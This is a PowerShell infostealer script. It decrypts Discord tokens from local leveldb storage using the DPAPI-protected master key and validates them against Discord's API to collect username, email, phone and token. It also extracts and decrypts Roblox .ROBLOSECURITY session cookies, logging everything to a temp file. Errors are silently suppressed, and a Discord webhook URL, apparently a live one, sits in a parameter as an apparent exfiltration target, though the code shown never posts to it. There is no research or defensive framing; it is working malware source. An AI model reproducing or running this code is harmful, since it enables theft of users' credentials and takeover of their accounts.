param([string]$WH = "https://discord.com/api/webhooks/1568090804273291414/tsKJS50AqiZaSsV-tTf7d2gUD7S1lAdAOymfmYyp1kF-lRuZPt9oaYgMRI86YcJkmkg0")
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$appdata = $env:APPDATA
$l = $env:LOCALAPPDATA
$outfile = Join-Path $env:TEMP "r.txt"
Remove-Item $outfile -Force -EA SilentlyContinue

# ---------- Discord tokens ----------
$mk = $null
try {
    $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
    $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
} catch {}

if ($mk) {
    $seen = @{}
    foreach ($dp in @("$appdata\discord\Local Storage\leveldb","$appdata\discordptb\Local Storage\leveldb","$appdata\discordcanary\Local Storage\leveldb")) {
        if (!(Test-Path $dp)) { continue }
        Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
            $raw = $null
            try {
                $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
                $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()
            } catch { return }
            if (!$raw) { return }
            foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})')) {
                $b64 = $m.Groups[1].Value
                while ($b64.Length % 4 -ne 0) { $b64 += '=' }
                try {
                    $eb = [Convert]::FromBase64String($b64)
                    if ($eb.Length -lt 80) { continue }
                    $nonce = $eb[3..14]
                    $tag   = $eb[($eb.Length-16)..($eb.Length-1)]
                    $ct    = $eb[15..($eb.Length-17)]
                    $a = New-Object System.Security.Cryptography.AesGcm($mk)
                    $pt = New-Object byte[] ($ct.Length)
                    $a.Decrypt($nonce, $ct, $tag, $pt); $a.Dispose()
                    $t = [Text.Encoding]::UTF8.GetString($pt).TrimEnd([char]0)
                    if ($t.Length -gt 40 -and !$seen[$t]) { $seen[$t] = $t }
                } catch {}
            }
        }
    }
    foreach ($t in $seen.Keys) {
        try {
            $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
            if ($r.username) { Add-Content $outfile "D|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$t" }
        } catch {}
    }
}

# ---------- Roblox ----------
foreach ($rp in @("$l\Roblox\LocalStorage\robloxcookies.dat","$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")) {
    if (Test-Path $rp) {
        try {
            $raw = Get-Content $rp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $eb = [Convert]::FromBase64String($Matches[1])
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $cookie = [Text.Encoding]::UTF8.GetString($db)
                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') { Add-Content $outfile "R|$($Matches[1])" }
                elseif ($cookie -match '_\|WARNING[^;\s]{50,}') { Add-Content $outfile "R|$($Matches[0])" }
                else { Add-Content $outfile "R|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))" }
            } elseif ($raw -match '\.ROBLOSECURITY') { Add-Content $outfile "R|$raw" }
        } catch {}
        break
    }
}
$msPaths = @("$l\RobloxPCGDK\LocalStorage\RobloxCookies.dat")
if (Test-Path "$l\Packages") {
    Get-ChildItem "$l\Packages\ROBLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue | % {
        $cp = Join-Path $_.FullName "LocalState\RobloxCookies.dat"
        if (Test-Path $cp) { $msPaths += $cp }
    }
}
foreach ($rp in $msPaths) {
    if (Test-Path $rp) {
        try {
            $raw = Get-Content $rp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $eb = [Convert]::FromBase64String($Matches[1])
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $cookie = [Text.Encoding]::UTF8.GetString($db)
                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') { Add-Content $outfile "M|$($Matches[1])" }
                elseif ($cookie -match '_\|WARNING[^;\s]{50,}') { Add-Content $outfile "M|$($Matches[0])" }
                else { Add-Content $outfile "M|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))" }
            }
        } catch {}
        break
    }
}

Add-Content $outfile "Z"
